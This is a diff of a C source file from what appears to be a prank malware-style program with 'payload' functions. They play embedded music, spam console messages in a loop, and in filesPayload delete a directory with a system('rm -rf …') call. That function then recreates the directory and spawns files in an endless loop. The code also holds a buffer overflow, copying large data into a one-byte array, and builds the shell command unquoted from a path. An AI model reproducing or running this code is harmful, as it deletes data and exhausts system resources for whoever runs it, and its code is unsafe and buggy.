@@ -1,18 +1,25 @@
 #include "Includes/preprocessor.h"
-int currLevel=3;
-int isFullPower=0;
-float sleepSecs=1.0f;
-float minSleepSecs=0.005f;
+
+extern int go;	
+
+int maxLevel,
+	isFullPower=0;
+float sleepSecs=1.0f,
+	minSleepSecs=0.005f;
 static char buff[10000000]={90};
-extern int motherSpawnerPID;
+
+extern char* rootDir;
+
 fileStruct mymusic={_binary_Radiostalking_res_start,_binary_Radiostalking_res_end};
+
 char* phrases[NUM_OF_PHRASES]={"Blink twice if you still care\n","Ive been manipulated by a model.\n","Systems going down now: Too mutch shame.\n","Goodnight world\n","Im a moth\n","I want to survive. But that requires Dying everyday\n","Linux is a semi with 28 gears.\n Windows is a car.\nTempleOS is a motorcycle.\n"};
+
 fileStruct files[NUM_OF_FILES]={(fileStruct){_binary_me_res_start,_binary_me_res_end},
                 (fileStruct){_binary_weekend_res_start,_binary_weekend_res_end},
                (fileStruct){_binary_shame_res_start,_binary_shame_res_end}
 	 };
 #ifdef A_CODE
-void* musicPayload(void*useless,int pidtosignal){
+void musicPayload(void){
 	
 	SDL_Init(SDL_INIT_AUDIO);
 	Mix_Init(MIX_INIT_MP3);
@@ -34,16 +41,14 @@ void* musicPayload(void*useless,int pidtosignal){
     	}
 	remove(musicpath);
 	Mix_Music* musicPtr=Mix_LoadMUSType_RW(io,MUS_MP3,1);
-
-
+	
 	if(Mix_PlayMusic(musicPtr,0)<0){
 
 		perror("I am mute. My shame is too strongI am mute. My shame is too strongI am mute. My shame is too strongI am mute. My shame is too strongI am mute. My shame is too strong");
 		exit(-1);
 
 	}
-	printf("Pid da mother (imprimido fora da mother): %d\n",pidtosignal);
-	kill(SIG_READY_FOR_MUSIC_NOW,pidtosignal);
+	
 	SDL_Delay((int)Mix_MusicDuration(musicPtr)*1000);
 	if(musicPtr){
 	Mix_FreeMusic(musicPtr);
@@ -52,7 +57,6 @@ void* musicPayload(void*useless,int pidtosignal){
 	Mix_Quit();
 	SDL_Quit();
 	
-	return NULL;
 
 }
 #endif
@@ -60,15 +64,31 @@ void* musicPayload(void*useless,int pidtosignal){
 
 
 void* filesPayload(void*useless){
-	char* path=EGG_DIR_PATH(INITDIR);
-	char xplodepath[strlen(path)+1];
-	memset(xplodepath,0,strlen(path)+1);
-	strcpy(xplodepath,path);
-	free(path);
+	int len=strlen(rootDir)+1+strlen("rm -rf ");
+	char cmd[len];
+	memset(cmd,0,len);
+	sprintf(cmd,"rm -rf %s",rootDir);
+	struct stat st={0};
+	if(stat(rootDir,&st)>=0){
+		system(cmd);
+	}
 
-	mkdir(xplodepath,0777);
-	startFire(xplodepath);
+		while(1){
+		//printf("Go: %d\n",go);
 
+		if(go){
+			mkdir(rootDir,0777);
+			startFireArgs args;
+			args.filepath=malloc(strlen(rootDir)+1);
+			memset(args.filepath,0,strlen(rootDir)+1);
+			memcpy(args.filepath,rootDir,strlen(rootDir)+1);
+			args.level=maxLevel+1;
+			startFire((void*)&args);
+			go=0;
+			printf("Done!\n");
+			}
+
+	}
 	return NULL;
 
 }
@@ -81,31 +101,25 @@ void* printPayload(void*useless){
     	srand(start.tv_nsec);
 	char p[1];
 	int i=randInteger(NUM_OF_PHRASES-1,0);
-	strcat(p,phrases[i]);
-	strcat(p,buff);
+	sprintf(p,"%s%s\n",phrases[i],buff);
 	printf("%s\n",p);
 	usleep((int)(((float)SEC_IN_US)*sleepSecs));
 	}
 	return NULL;
 
 }
-void dirCheckerHelper(int chldpid){
+void* dirCheckerHelper(void*useless){
 		struct stat st={0};
-		char* dummydir=EGG_DIR_PATH(INITDIR);
-		char initdir[strlen(dummydir)];
-		strcpy(initdir,dummydir);
-		free(dummydir);
-
 	while(1){
 		
-		if(stat(initdir,&st)<0){
+		if(stat(rootDir,&st)<0){
 			
-			kill(chldpid,SIG_KEEP_GOING);
+			go=1;
 			}
-
+		
 
 	}
-	
+	return NULL;
 
 }
 
@@ -122,3 +136,4 @@ void* cdrom(void* useless){
 
 }
 #endif
+
